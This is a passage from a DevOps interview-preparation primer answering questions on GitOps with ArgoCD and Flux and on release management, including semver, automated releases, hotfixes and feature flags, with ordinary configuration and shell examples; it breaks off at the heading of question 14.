For *many clusters or many similar apps*, you graduate to **ApplicationSets** (next question), which template Applications from a generator instead of hand-writing each child — but app-of-apps remains the clean pattern for a curated, heterogeneous set of platform components.

### Q6. What are ApplicationSets and what problem do they solve?

An **ApplicationSet** templates the generation of many ArgoCD Applications from a **generator**, solving the "I have 40 clusters / 30 microservices / one Application-per-PR" scaling problem where hand-writing each Application doesn't scale.

```yaml
apiVersion: argoproj.io/v1alpha1
kind: ApplicationSet
metadata:
  name: my-app-per-cluster
spec:
  generators:
    - clusters: {}          # one Application per registered cluster
  template:
    metadata:
      name: 'my-app-{{name}}'
    spec:
      source:
        repoURL: https://github.com/acme/my-app-config.git
        path: 'overlays/{{metadata.labels.env}}'
      destination:
        server: '{{server}}'
        namespace: my-app
```

Generators include: **cluster** (one app per registered cluster), **git** (one per directory/file in a repo — great for env overlays), **list** (a static set), **PR** (one ephemeral Application per open pull request — preview environments), and **matrix/merge** (combinations).

The value: fleet-scale delivery stays DRY. Add a cluster and every app deploys to it automatically; open a PR and get a preview environment; add a service directory and it's onboarded. It's the mechanism that makes GitOps viable across a large, dynamic set of targets without a wall of copy-pasted Application manifests.

### Q7. How does Flux differ from ArgoCD?

Both are CNCF *graduated* GitOps agents solving the same reconciliation problem; they differ in philosophy.

| | ArgoCD | Flux |
|---|---|---|
| Shape | Monolithic app with a rich UI | Set of composable controllers (GitOps Toolkit) |
| Core objects | Application, ApplicationSet | GitRepository, Kustomization, HelmRelease |
| UI | First-class, real-time web UI | No built-in UI (use Weave GitOps / CLI) |
| Model | Opinionated, app-centric | Unix-y, controller-per-concern |
| Image automation | Via Argo Image Updater (add-on) | Built-in ImageUpdateAutomation controller |
| Multi-tenancy | Projects, RBAC in the app | Kubernetes RBAC + per-tenant Kustomizations |

**Flux** composes small controllers: `GitRepository` (a source), `Kustomization` (reconcile a path with Kustomize), `HelmRelease` (reconcile a Helm chart), and `ImageRepository`/`ImageUpdateAutomation` (watch a registry and commit new tags back to Git). You wire them together.

```yaml
apiVersion: kustomize.toolkit.fluxcd.io/v1
kind: Kustomization
metadata:
  name: my-app
  namespace: flux-system
spec:
  interval: 5m
  sourceRef: { kind: GitRepository, name: my-app-config }
  path: ./overlays/production
  prune: true
```

Choose ArgoCD when you want a polished UI and an app-centric mental model out of the box; choose Flux when you want composable, Kubernetes-native controllers and built-in image automation, and you're comfortable without a bundled UI. Neither is obsolete; both are mainstream.

### Q8. Explain drift detection and self-heal.

**Drift** is when the live cluster state diverges from what Git declares — someone ran `kubectl scale`, `kubectl edit`, or a controller from outside changed something. In non-GitOps setups drift accumulates silently and is the root of "nobody knows the actual state of prod."

**Drift detection**: the agent's reconciliation loop continuously compares declared (Git) vs actual (cluster) state and flags divergence — ArgoCD marks the resource `OutOfSync` and shows a diff; Flux reports the Kustomization as drifted.

**Self-heal**: with self-heal enabled, the agent doesn't just *report* drift — it *reverts* it, re-applying Git's declared state over the manual change. Your out-of-band `kubectl edit` gets undone within a reconcile interval.

This is a feature, not a bug, and it's the source of a common misunderstanding. If you need to change prod, you change *Git* (a reviewed commit), not the live cluster. Self-heal enforces the invariant that Git is truth: it makes drift impossible to sustain, which is exactly what kills the snowflake-environment problem. The one caution is emergency situations — during an incident you may temporarily disable self-heal to hand-patch, but the discipline is to then reconcile that fix *back into Git* so the change persists and is audited. Live-only fixes are, by design, temporary.

### Q9. How is CI/CD split in a GitOps setup?

GitOps splits the pipeline cleanly, usually across **two repositories**:

- **App repo** — application source. **CI** runs here: build, test, and produce an immutable image (`ghcr.io/acme/my-app@sha256:...`). CI's *final* step is not to deploy — it's to update the desired state: open a PR (or commit) to the **config repo** bumping the image tag/digest.
- **Config repo** — declarative manifests (Kustomize/Helm) describing what runs in each environment. **CD** happens here: the GitOps agent watches this repo and deploys whatever it declares.

```yaml
# App repo CI: build, then bump the digest in the config repo
- name: Update config repo
  run: |
    git clone https://github.com/acme/my-app-config
    cd my-app-config
    kustomize edit set image ghcr.io/acme/my-app@${{ steps.build.outputs.digest }}
    git commit -am "deploy ${{ github.sha }} to staging"
    git push   # or open a PR for a gated environment
```

The separation matters: CI has *no cluster credentials* (it only writes to Git). Deployment is triggered by the config-repo change, reconciled by the in-cluster agent. Promotion between environments is a change in the config repo (edit the prod overlay's digest), reviewable as a PR. This split is what gives GitOps its security posture and its clean audit story — the app repo's history is *what the code did*, the config repo's history is *what was deployed*.

### Q10. How do you roll back in GitOps?

**Rollback is `git revert`.** Because the config repo's history *is* your deploy history, reverting the commit that introduced the bad state — and letting the agent reconcile — returns the system to the previous known-good declaration.

```bash
# Revert the deploy commit; the agent reconciles the cluster back
git revert <bad-deploy-sha>
git push
```

Or, in ArgoCD, click "History and Rollback" and select a previous synced revision — same effect, driven from the UI, though a `git revert` is preferable because it keeps Git as the source of truth (a UI rollback that isn't reflected in Git *is itself drift* the agent may try to re-sync away).

Two things make this clean. First, you're reverting a *declaration*, and because you build-once/deploy-a-digest, the previous declaration references a previously-built image that still exists — no rebuild, no risk of "the old commit no longer compiles." Second, the rollback is auditable: it's a commit, reviewed like any other. The failure mode to avoid is rolling back by hand in the cluster (`kubectl` the old image) — self-heal will fight you, because Git still declares the bad version. In GitOps, the way out is always *through Git*.

### Q11. How do you handle secrets in GitOps if you can't commit plaintext?

You never commit plaintext secrets to the config repo — it's Git, often shared, and history is forever. Three mainstream patterns:

- **Sealed Secrets (Bitnami)** — you encrypt a Secret with the cluster controller's public key into a `SealedSecret` CRD that's *safe to commit*. Only the in-cluster controller (holding the private key) can decrypt it into a real Secret. Encryption is one-way in Git; only the target cluster can unseal.

- **SOPS (often with age/KMS)** — encrypt the *values* of a YAML/JSON secret file with a KMS key or age key; commit the encrypted file. Flux decrypts SOPS files natively at reconcile time; ArgoCD via a plugin. Nice because the file stays diff-able (keys visible, values encrypted).

- **External Secrets Operator** — don't store the secret in Git at all; commit an `ExternalSecret` CRD that *references* a secret in a real store (Vault, AWS/GCP Secret Manager). The operator fetches it and materializes a Kubernetes Secret. Git holds only a pointer.

```yaml
# ExternalSecret: Git holds a reference, not the value
apiVersion: external-secrets.io/v1
kind: ExternalSecret
spec:
  secretStoreRef: { name: aws-secrets, kind: ClusterSecretStore }
  target: { name: my-app-secrets }
  data:
    - secretKey: db-password
      remoteRef: { key: prod/my-app/db-password }
```

Rule of thumb: **external-secrets** when you already run a secret manager (best separation); **sealed-secrets/SOPS** when you want secrets self-contained in Git without an external store.

### Q12. How does progressive delivery work with GitOps?

Progressive delivery — canary and blue-green with automated analysis — layers onto GitOps via controllers that extend the reconciliation loop: **Argo Rollouts** (with ArgoCD) and **Flagger** (with Flux, and works with ArgoCD too).

You declare the *rollout strategy* in Git alongside the workload. Instead of a plain Deployment, you use a `Rollout` (Argo Rollouts) that describes canary steps and the metrics to check between them:

```yaml
apiVersion: argoproj.io/v1alpha1
kind: Rollout
spec:
  strategy:
    canary:
      steps:
        - setWeight: 10
        - pause: { duration: 5m }
        - analysis:
            templates: [{ templateName: success-rate }]  # query Prometheus
        - setWeight: 50
        - pause: { duration: 5m }
        - setWeight: 100
```

The agent still reconciles desired state from Git, but the rollout controller now drives a *gradual* traffic shift, runs automated analysis (error rate, latency from Prometheus/Datadog) at each step, and **auto-rolls-back** if a metric regresses — all without a human. Flagger works similarly, watching a metric provider and automating the canary promote/abort.

The elegance: your *release strategy* is now declarative and version-controlled like everything else. Changing "canary at 10% then 50%" to "blue-green" is a Git commit. Progressive delivery gives GitOps automated, metric-driven safety at the moment of rollout, closing the gap between "deployed" and "safely released."

### Q13. How do you do multi-cluster and multi-environment delivery with GitOps?

Two composable mechanisms: **structure in the config repo** (overlays per environment) and **generators** (ApplicationSets / Flux per-cluster Kustomizations) to fan out.

**Multi-environment** uses Kustomize overlays: a `base/` with common manifests, and `overlays/staging`, `overlays/production` patching env-specific values (replicas, resources, image digest). Promotion = editing the prod overlay's digest, via PR.

**Multi-cluster** uses ApplicationSets with a cluster generator (Q6): one templated Application per registered cluster, each pointing at the right overlay. Register a new cluster and every app deploys to it automatically.

```text
my-app-config/
  base/
  overlays/
    staging/     (digest bumped by CI on merge)
    production/  (digest bumped by PR from staging -> gated)
```

For a large fleet you combine both: an ApplicationSet with a **matrix** generator (clusters × environments) produces the full grid of Applications from one template. The single source of truth stays Git; the generators keep it DRY. This is how organizations run hundreds of clusters without hundreds of hand-written manifests — declare the *pattern*, let the generator materialize the instances, and let each cluster's agent pull its slice.

### Q14. Why is GitOps particularly suited to Kubernetes?

GitOps and Kubernetes fit because Kubernetes is *already* a declarative reconciliation system, and GitOps just extends the loop out to Git.

- **Declarative API** — everything in Kubernetes is a declared object (Deployment, Service, ConfigMap) that its own controllers reconcile toward. GitOps agents plug into this natively: "desired state" is just more Kubernetes manifests, and the agent uses the same apply-and-converge model Kubernetes already runs internally.
- **CRDs** — the agents *are* Kubernetes controllers (ArgoCD Application, Flux Kustomization are CRDs). GitOps is idiomatic, not bolted-on.
- **Idempotent apply** — `kubectl apply` (and the agents) are declarative and idempotent, so continuous reconciliation is safe to run every few minutes.
- **In-cluster agent** — the pull model needs somewhere inside the target to run the loop; Kubernetes gives you exactly that (a Deployment).

Outside Kubernetes, GitOps is fuzzier: Terraform-based "GitOps for infra" exists (Atlantis, Terraform Cloud reconciling on PR), but plain VMs or serverless lack the built-in declarative-reconciliation substrate, so you get versioned-config-in-Git without the same continuous self-healing loop. Kubernetes' entire design — declare desired state, let controllers converge — is the same idea GitOps applies at the delivery layer, which is why the two grew up together.

### Q15. How does environment promotion work in GitOps?

Promotion becomes a **Git operation**: move the same image digest from one environment's overlay to the next, via a reviewed change.

Concretely, with overlays per environment:

1. CI builds the image, pushes it, and commits the new digest to `overlays/staging`. The agent deploys to staging automatically.
2. After staging validates, **promotion is a PR** that copies that digest into `overlays/production`.
3. The PR review *is* the approval gate and the separation of duties — a different person merges it. Merge triggers the agent to deploy to prod.

```bash
# Promote the validated staging digest to production
STAGING_DIGEST=$(yq '.images[0].digest' overlays/staging/kustomization.yaml)
yq -i ".images[0].digest = \"$STAGING_DIGEST\"" overlays/production/kustomization.yaml
git checkout -b promote-to-prod && git commit -am "promote $STAGING_DIGEST to prod"
# open PR -> review -> merge -> agent reconciles prod
```

This is elegant because it unifies several concerns from [[Environments & Promotion]]: promotion is build-once/deploy-many (you move a *digest*, never rebuild), the gate and separation-of-duties are just PR review, and the whole thing is audited in Git history. "What's in prod and who put it there" is answered by `git log` on the prod overlay. Continuous-deployment variants auto-open and auto-merge these PRs when checks pass; gated variants require a human merge.

### Q16. How is GitOps different from a traditional deploy pipeline — and when might you *not* use it?

| | Traditional pipeline | GitOps |
|---|---|---|
| Deploy trigger | Pipeline job runs | Agent reconciles Git |
| Direction | Push (CI → cluster) | Pull (agent → Git) |
| Source of truth | The pipeline's last run | Git repo state |
| Drift handling | None | Detected + self-healed |
| Rollback | Re-run pipeline / manual | `git revert` |
| Cluster creds | In CI | In cluster only |
| Audit | Pipeline logs | Git history |

The GitOps advantages: no cluster credentials in CI (security), continuous drift correction (no snowflakes), Git as a complete audit log, and trivial rollback. The cost: it's an extra system to run (the agent, the config repo), it has a learning curve, and it's most natural on Kubernetes.

When you might *not* use it: if you're not on Kubernetes (a simple serverless app or a single VM), the reconciliation substrate isn't there and the ceremony may outweigh the benefit — a straightforward push pipeline is fine. If your team is tiny and ships to one target, the config-repo split and agent are overhead. And for genuinely imperative operations (one-off data migrations, certain stateful cutovers) you still need a place for procedural steps — GitOps handles *desired state*, not *ordered actions*, though sync hooks/waves cover some of that. The honest senior answer: GitOps is the strong default for multi-cluster Kubernetes delivery, and overkill for a hobby project on a PaaS.

## Release Management & Versioning

### Summary

**What this topic covers**

Turning a stream of merged changes into named, versioned, communicable *releases* — and the machinery that automates the toil out of it. Three concern areas: (1) **versioning schemes** — semantic versioning as the default contract, plus CalVer, git-sha, and monotonic build numbers, and when each fits; (2) **automation** — deriving the version, changelog, tag, and publish from Conventional Commits (semantic-release, release-please, changesets), so cutting a release is a pipeline step, not a human ritual; and (3) **release strategy** — cadence (continuous vs release trains vs scheduled), monorepo vs polyrepo release models, hotfixes and backporting, decoupling *deploy* from *release* with feature flags, and the runbook for coordinating a release across services. The 15 questions run from "what does MAJOR.MINOR.PATCH communicate" to "walk me through cutting a coordinated multi-service release, and how do you hotfix a version that's three releases behind prod."

**Mental model**

Separate three things that beginners fuse: **deploy** (the artifact is running in an environment), **release** (users can actually use the change), and **version** (the human-readable name for a set of changes). Mature teams decouple all three — you can deploy code that's dark behind a flag, release it later by flipping the flag, and version it independently. A version number is a *communication contract*, not a counter: under semver, bumping MAJOR promises "I broke something you depend on," MINOR promises "new stuff, nothing broken," PATCH promises "just fixes." Consumers make upgrade decisions on that promise, so the number must be *honest* — which is exactly why you automate it from Conventional Commits rather than trusting a human to remember. The other shift is that a release should be **reproducible and immutable**: `v2.3.1` is a specific tagged commit and a specific built artifact, forever — you never rebuild or re-tag it. Releasing is then a mechanical, auditable act on top of that immutable substrate, not a heroic manual event.

**Key terms**

- **Semantic versioning (semver)** — MAJOR.MINOR.PATCH where bumps communicate breaking / feature / fix respectively.
- **CalVer** — calendar-based versioning (e.g. `2026.07.0`); communicates *when*, not *what*.
- **Conventional Commits** — a commit-message convention (`feat:`, `fix:`, `feat!:`) that machines parse to derive version bumps and changelogs.
- **semantic-release / release-please / changesets** — tools that automate versioning, changelog, tag, and publish in CI.
- **Changelog** — a human-readable record of what changed per version (Keep a Changelog format).
- **Annotated tag** — a Git tag object (with author, date, message) marking a release commit; the anchor of a release.
- **Release train** — a fixed schedule; whatever's merged by the cutoff ships, the rest waits for the next train.
- **Hotfix** — an urgent patch to an already-released version, often via cherry-pick to a release branch.
- **Backport** — applying a fix made on `main` to an older still-supported release line.
- **Deploy vs release** — running the code vs exposing the change to users; decoupled via feature flags.
- **Pre-release channel** — alpha/beta/rc (and canary) versions shipped to opt-in users before GA.
- **Deprecation policy** — the documented promise of how long old versions/APIs are supported before removal.

**Why interviewers ask this**

Release management reveals whether a candidate thinks about software as a product consumed by others, or just code that runs. Junior signal: treats versioning as an arbitrary number they bump by hand, conflates deploy with release, and has no story for hotfixing a released version. Senior signal: knows semver is a *contract* and can reason about what a consumer infers from each bump; automates releases from Conventional Commits to remove human error and toil; distinguishes deploy/release/version cleanly and uses flags to decouple them; and has a concrete, tested procedure for hotfixes, backports, and coordinated multi-service releases. Platform/DevOps interviewers especially probe monorepo release models (independent vs lockstep versioning), the deploy-vs-release distinction, and "walk me through cutting a release end to end" — because release process is where reliability, communication, and automation intersect, and where a shaky answer predicts a team that ships scary, manual, error-prone releases.

**Common confusions**

- "Deploy and release are the same thing" — no; you can deploy code that's dark behind a flag and release it later, and you should, to shrink deploy risk.
- "The version number is just a counter" — it's a communication contract; under semver each position *promises* something to consumers.
- "A PATCH bump is always safe to take" — only if the publisher honors semver; the *convention* is a promise, not a guarantee, which is why lockfiles pin exact versions.
- "You bump the version by editing package.json" — that's the manual/error-prone way; derive it from commit history so it's honest and toil-free.
- "In a monorepo everything shares one version" — that's *one* model (lockstep); independent versioning (changesets) releases only changed packages, and is usually better for libraries.
- "Rolling back a release is the normal recovery" — often rolling *forward* (a fast fix) is safer, especially with irreversible migrations; rollback isn't always available.
- "0.x versions follow semver" — pre-1.0, anything may break in a MINOR; semver's guarantees only fully apply from 1.0.0.

**What follows from this topic**

Release management sits on top of everything earlier in this primer. It versions the immutable artifact from the packaging topic (a release *is* a tagged commit plus a built digest). It decides *when* the artifact promoted through [[Environments & Promotion]] is actually exposed to users — the deploy-vs-release split is the same feature-flag decoupling raised there. In [[GitOps & Pull-based CD]], the release history literally *is* Git history, and rolling back a release is `git revert`. And the automation here (semantic-release deriving a version and changelog in CI) is the natural capstone of a CI pipeline — the last mile that turns "green build" into "named, published, communicated release."

### Q1. Explain semantic versioning — what does each part communicate?

**Semver is `MAJOR.MINOR.PATCH`**, and each position is a *promise to consumers*:

- **MAJOR** (`2.0.0`) — a **breaking change**. Something consumers depend on changed or was removed; upgrading may require code changes. Bumping MAJOR resets MINOR and PATCH to 0.
- **MINOR** (`1.3.0`) — **new, backward-compatible** functionality. New features, nothing existing broken; safe to upgrade. Resets PATCH to 0.
- **PATCH** (`1.2.4`) — **backward-compatible bug fixes** only. No new features, no breaks.

Beyond the core three:

- **Pre-release** — a suffix like `1.4.0-beta.1` or `-rc.2`, lower precedence than the release, signaling not-yet-stable.
- **Build metadata** — `+20260701.abc123` after a `+`, ignored for precedence; just annotation.
- **0.x** — the special pre-1.0 zone where the guarantees *don't* fully apply: anything may break in a MINOR, because you're declaring the API isn't stable yet.

The point of semver is that consumers can set dependency ranges (`^1.2.0` = "any 1.x ≥ 1.2.0") and *trust* the number to tell them whether an upgrade is safe. That trust only holds if publishers bump honestly — which is the whole argument for automating the bump from commit history rather than human judgment.

### Q2. When would you choose CalVer, git-sha, or build numbers over semver?

Semver is the default for *libraries and APIs* others depend on, because consumers need the breaking/feature/fix signal. But it's not always the right scheme:

| Scheme | Example | Communicates | Use when |
|---|---|---|---|
| Semver | `2.3.1` | Compatibility contract | Libraries, public APIs, anything consumers pin |
| CalVer | `2026.07.0` | *When* it shipped | Apps/OS/tools where "how old is it" matters more than compat (Ubuntu, pip) |
| Git-sha | `a1b2c3d` | Exact source | Internal services, container tags — precise, immutable, non-comparable |
| Build number | `#4821` | Monotonic build order | CI-internal, ordering builds; no semantic meaning |

**CalVer** shines for end-user products and continuously-delivered apps where there's no meaningful "breaking change" contract with an external consumer — users care that they're on the July release, not that it's `2.3.1`. **Git-sha** is ideal for internal service deploys and image tags: it's immutable, unambiguous, and maps a running artifact straight back to source — but it doesn't sort or communicate compatibility. **Build numbers** give monotonic ordering for CI but no semantics.

Many setups combine them: a container tagged with both a semver *and* the git-sha, or CalVer for the app with semver for its internal libraries. Match the scheme to what the *consumer of the number* actually needs to know.

### Q3. How do automated release tools work, and why use them?

Tools like **semantic-release**, **release-please**, and **changesets** move the entire release act into CI, derived from your commit history — no human decides the version or writes the changelog.

The semantic-release flow, triggered on merge to `main`:

1. **Analyze commits** since the last release. Conventional Commits map to bumps: `fix:` → PATCH, `feat:` → MINOR, `feat!:` / `BREAKING CHANGE:` → MAJOR.
2. **Determine the next version** from the highest bump found.
3. **Generate the changelog** from the commit messages.
4. **Tag** the commit and create a GitHub/GitLab Release with notes.
5. **Publish** the artifact (npm publish, push image, etc.).

```yaml
# GitHub Actions: fully automated release on merge to main
jobs:
  release:
    runs-on: ubuntu-latest
    permissions: { contents: write, issues: write, packages: write }
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }   # full history for commit analysis
      - uses: actions/setup-node@v4
      - run: npx semantic-release
        env: { GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} }
```

Why bother: it **removes release toil and human error**. Versions become honest (derived from what actually changed), changelogs are never forgotten, releases are consistent and frequent, and nobody stays late to "cut the release." **release-please** differs by opening a *release PR* that accumulates changes until you merge it (a human gate); **changesets** (below) suits monorepos. The common thread: the release is a *computed artifact of your commits*, not a manual ceremony.

### Q4. What are Conventional Commits and how do they drive releases?

**Conventional Commits** is a lightweight commit-message convention that makes history machine-readable:

```text
<type>[optional scope][!]: <description>

[optional body]

[optional footer: BREAKING CHANGE: ...]
```

Common types: `feat:` (a feature → MINOR), `fix:` (a bug fix → PATCH), plus `docs:`, `chore:`, `refactor:`, `test:`, `ci:` (no release). A `!` after the type, or a `BREAKING CHANGE:` footer, signals a MAJOR bump.

```text
feat(auth): add OAuth login support        -> MINOR bump
fix(api): handle null user in /profile     -> PATCH bump
feat(api)!: drop deprecated v1 endpoints    -> MAJOR bump
```

This convention is the *input* that makes automated releasing possible. Because each commit self-declares its impact, a tool can: (1) compute the correct semver bump from the highest-impact commit since the last release, and (2) generate a grouped changelog ("Features", "Bug Fixes", "BREAKING CHANGES") directly from the messages.

The discipline it demands is real — developers must write structured commit subjects — but the payoff is that versioning and changelogs become *honest and automatic*. Teams enforce it with commit-lint in CI (or a commit hook) so a malformed message fails fast. It's the small upfront convention that unlocks the entire automated-release pipeline.

### Q5. How do you generate and maintain a changelog?

A changelog is the human-facing "what changed per version" record. The modern approach is **generate it from Conventional Commits**, not hand-write it — hand-maintained changelogs rot because someone always forgets.

The generator (semantic-release, release-please, or standalone `conventional-changelog`) groups commits since the last tag into sections:

```text
[2.3.0] - 2026-07-01   (a level-2 heading in the real file)

Features                (a level-3 heading)
  - auth: add OAuth login support (#412)

Bug Fixes               (a level-3 heading)
  - api: handle null user in /profile (#419)

BREAKING CHANGES        (a level-3 heading)
  - api: v1 endpoints removed; migrate to v2
```

Follow the **Keep a Changelog** conventions: reverse-chronological, one section per version with a date, grouped by change type, and a link to the version's diff/tag. The audience is *humans deciding whether/how to upgrade*, so a good changelog highlights breaking changes prominently and gives migration hints — not just a raw commit dump.

The interview point: an auto-generated changelog is only as good as your commit hygiene. If commits are `wip`, `fix stuff`, `asdf`, the changelog is garbage. So the changelog quality argument is *also* an argument for Conventional Commits and PR-title linting. Some teams generate from *PR titles* instead of raw commits (squash-merge with a clean title), which keeps the changelog readable even with messy in-branch commits.

### Q6. How do git tags and releases relate to versioning?

A **tag** is the anchor: an **annotated tag** (`git tag -a v2.3.0 -m "..."`) is a real Git object carrying an author, date, and message, marking the exact commit a version was cut from. Prefer annotated (or signed) tags over lightweight ones for releases — they're auditable and can't be silently moved.

```bash
git tag -a v2.3.0 -m "Release 2.3.0"
git push origin v2.3.0
```

A **Release** (GitHub Releases, GitLab Releases) is a layer on top of the tag: it attaches release *notes* (usually the changelog for that version), and can **attach built artifacts** (binaries, checksums, SBOMs) so consumers download a specific, immutable build tied to that tag.

The relationship: **version → tag → release → artifacts**. The version names the change set; the tag pins it to an immutable commit; the release publishes human notes and downloadable binaries against that tag. This chain is what makes a release *reproducible and auditable* — anyone can check out `v2.3.0`, see exactly what shipped, read why, and download the exact artifact.

The rule that makes it trustworthy: **tags and releases are immutable**. You never move `v2.3.0` to a different commit or re-upload different binaries under it. If `2.3.0` is broken, you ship `2.3.1` — you don't rewrite history, because consumers may already depend on the exact bits `2.3.0` pointed at.

### Q7. Compare release cadences — continuous, release trains, and scheduled.

| Cadence | How it works | Pros | Cons |
|---|---|---|---|
| **Continuous** | Every green change releases immediately | Smallest batches, fastest feedback, tiny blast radius per release | Needs strong automation + tests; noisy for consumers who must track many versions |
| **Release train** | Fixed schedule (e.g. every 2 weeks); whatever's merged by cutoff ships, rest waits | Predictable dates, decouples merge from ship, room for stabilization | A feature that misses the cutoff waits a whole cycle; larger batches |
| **Scheduled / milestone** | Ship on a planned date or when a milestone is done | Fits marketing/coordination, heavy QA windows | Big-bang releases, high risk, slow feedback, "release crunch" |

**Continuous** suits SaaS/web where you control the deployment and users don't manage versions — smaller batches mean lower risk per release and faster learning (the DORA "deploy frequency" and "lead time" wins). **Release trains** suit larger orgs or products with many consumers who need predictable cadence and a stabilization window (browsers, mobile app stores partly force this). **Scheduled** suits products with external coordination costs — a major version launch, a customer-facing milestone, regulated releases.

The senior framing: smaller and more frequent is *safer*, not riskier — a bug in a 3-commit release is trivial to locate versus a bug in a quarterly big-bang. So the direction of travel is toward continuous, with trains as the compromise when full continuous isn't yet feasible and scheduled reserved for genuinely coordinated launches.

### Q8. How do you handle releasing in a monorepo versus polyrepo?

The core question is: when package A changes, what version does everything get?

**Polyrepo** — each service/library has its own repo, its own pipeline, its own version. Simple and independent, but coordinating a change spanning several repos is painful (multiple PRs, version dance).

**Monorepo** — one repo, many packages. Two release models:

- **Lockstep / fixed** — every package shares one version; a release bumps them all together (Angular-style, Lerna fixed mode). Simple to reason about, but a package with no changes still gets a new version, and consumers see churn.
- **Independent** — each package versions on its own; you release *only the packages that changed* and their dependents. **changesets**, **Nx**, and **Lerna independent mode** do this. Better for a library collection where consumers pin packages individually.

```markdown
<!-- a changeset: declares intent for the next release -->
---
"@acme/ui": minor
"@acme/utils": patch
---
Add Button variant; fix clsx edge case
```

**changesets** is the popular independent-versioning tool: contributors add a "changeset" file per PR declaring which packages bumped and how; at release time it aggregates them, computes each package's version, updates changelogs, and publishes only what changed (plus dependents, via version-range propagation).

Rule of thumb: **independent versioning** for a monorepo of separately-consumed libraries (honest per-package semver); **lockstep** for a suite meant to be used together at one version (a framework and its official plugins). Polyrepo when teams are truly independent and cross-repo coordination is rare.

### Q9. How do you ship an urgent hotfix to a version that's several releases behind prod?

The scenario: prod runs `v2.3.0`, `main` is already at `v2.6.0-dev` with unshippable half-done work, and `v2.3.0` has a critical bug. You can't just release `main`.

The standard approach is a **release branch + cherry-pick**:

1. Branch from the *released tag*: `git checkout -b hotfix/2.3.1 v2.3.0`.
2. Apply the minimal fix on that branch (or cherry-pick it if it already exists on `main`).
3. Tag and release `v2.3.1` from the hotfix branch, deploy it.
4. **Cherry-pick / merge the fix back to `main`** so it isn't lost in the next release (the classic hotfix footgun — fixing prod but forgetting to forward-port).

```bash
git checkout -b hotfix/2.3.1 v2.3.0
git cherry-pick <fix-sha>        # the fix, isolated
git tag -a v2.3.1 -m "Hotfix: ..."   # release + deploy
git checkout main && git cherry-pick <fix-sha>   # forward-port
```

This is the **release-branch model** (GitFlow-ish): long-lived release branches let you patch old versions independently of `main`. The **trunk-based** alternative avoids the whole problem by keeping `main` always releasable and shipping so continuously that "prod is many releases behind" never happens — the fix goes to `main` and out via the normal fast pipeline, often behind a flag. Trunk-based is preferred where feasible precisely because it makes hotfixes ordinary rather than special; release branches are the answer when you *must* support multiple live versions (shipped software, multiple customer versions).

### Q10. How do feature flags let you decouple deploy from release?

**Deploy** = the code is running in prod. **Release** = users can actually use the feature. Feature flags split them: you deploy the code with the feature *off*, then release it later by flipping the flag — no new deploy.

```javascript
if (flags.isEnabled('new-checkout', { userId })) {
  return renderNewCheckout();   // dark until the flag is flipped
}
return renderLegacyCheckout();
```

Why this is powerful for release management:

- **Deploy risk shrinks** — you deploy small, dark changes continuously; each deploy carries almost no user-facing risk because nothing is exposed yet.
- **Release becomes a business decision** — product flips the flag when *they* want, independent of the engineering pipeline. Ship code Tuesday, release Friday at launch.
- **Progressive release** — enable for 1% → 10% → 100%, or by segment (beta users first), watching metrics.
- **Instant kill switch** — a bad feature is turned *off* in seconds, faster and safer than a rollback deploy.

The cost: flags are state that accumulates. Every flag is a branch in your code and a dimension in your test matrix; stale flags rot into risk. So the discipline is to *remove* flags once a feature is fully released and stable. Used well, flags are the mechanism that makes Continuous Deployment safe — you can auto-ship every commit because shipping code and releasing features are now different acts.

### Q11. Rolling forward versus rolling back a release — when do you do which?

Both are recovery moves; the choice depends on reversibility and speed.

**Roll back** — return to the previous known-good release. Fast and low-thought when the change is cleanly reversible: redeploy the prior immutable artifact (or `git revert` in GitOps). Ideal for a stateless bug where the old version is definitely fine.

**Roll forward** — ship a *new* release with a fix on top. You do this when rollback is *unavailable or unsafe*:

- **Irreversible migrations** — the new version ran a schema migration the old version can't run against. Rolling back means the old code hits a schema it doesn't understand. Forward-fix instead.
- **The bug is old** — it exists in the previous release too; rolling back doesn't fix it.
- **Data written in the new format** — reverting the code would orphan or corrupt data already written by the new version.

The senior nuance: **design for rollback** (backward-compatible migrations, expand-then-contract schema changes, feature flags) so that rollback *stays* available as the fast, safe default. But recognize that once state has moved forward irreversibly, rolling forward is the only correct move — and if your fix is fast to ship (small batches, quick pipeline), forward-fix is often *preferable* anyway because it doesn't lose the good changes bundled in the release. The worst position is needing to roll back and discovering you can't; the best is making rollback boring and always possible.

### Q12. How do pre-release channels (alpha/beta/rc, canary) fit into releasing?

Pre-release channels let users opt into not-yet-stable versions before general availability, giving you real-world feedback before the whole population is exposed.

The semver pre-release ladder, increasing stability:

- **alpha** (`2.0.0-alpha.1`) — early, incomplete, expect breakage; internal or brave early adopters.
- **beta** (`2.0.0-beta.3`) — feature-complete, still stabilizing; wider opt-in testing.
- **rc / release candidate** (`2.0.0-rc.1`) — believed shippable; released as-is unless a blocker surfaces.
- **GA** (`2.0.0`) — general availability, the stable release.

Pre-releases have *lower precedence* than the final version, so `^2.0.0` won't accidentally pull `2.0.0-beta.1` — consumers must opt in explicitly (`npm install pkg@beta`). Package managers model this as **dist-tags/channels** (`latest`, `next`, `beta`).

**Canary** is a distinct-but-related idea: a continuously-published bleeding-edge build (often per-commit, e.g. `2.1.0-canary.abc123`) for people who want *the very latest*, plus — confusingly sharing the name — the *deployment* canary (route a small % of prod traffic to a new version and watch metrics). Both share the theme: expose the new thing to a *small, tolerant audience first*.

The value for release management: channels let you gather signal and build confidence progressively, so GA is boring. A library ships rc.1, waits, and promotes it to GA unchanged if no blockers appear — the rc *is* the release, just with a safety window.

### Q13. What is backporting and when is it necessary?

**Backporting** is applying a change (usually a fix) made on `main` to an *older, still-supported* release line. It's the flip side of forward-porting: instead of carrying a hotfix from an old branch up to `main`, you carry a `main` fix *down* to old branches.

You need it when you **support multiple live versions simultaneously** — the situation where trunk-based "everyone's on latest" doesn't hold:

- **Shipped/on-prem software** where customers run `v1.x`, `v2.x`, `v3.x` and you've promised to patch security issues in all supported lines.
- **LTS (long-term support) releases** — a fix on the current line must reach the LTS line users pinned to for stability.
- **Regulated environments** where customers can't take the latest version but need critical fixes.

```bash
# Fix landed on main as <sha>; backport to the 2.x support branch
git checkout release/2.x
git cherry-pick <sha>          # may need conflict resolution vs old code
git tag -a v2.4.3 -m "Backport: security fix"
```

The cost is real: each supported line is a branch you must build, test, and release, and cherry-picks can conflict against divergent old code. That's why teams define a **support policy** ("we support the latest two minor versions and the current LTS") to *bound* how many lines they backport to. If you're pure-SaaS with one live version, backporting mostly disappears — everyone's already on latest. The need for backporting scales directly with how many versions you've committed to keep alive.

### Q14. Walk me through cutting a coordinated release across multiple services.

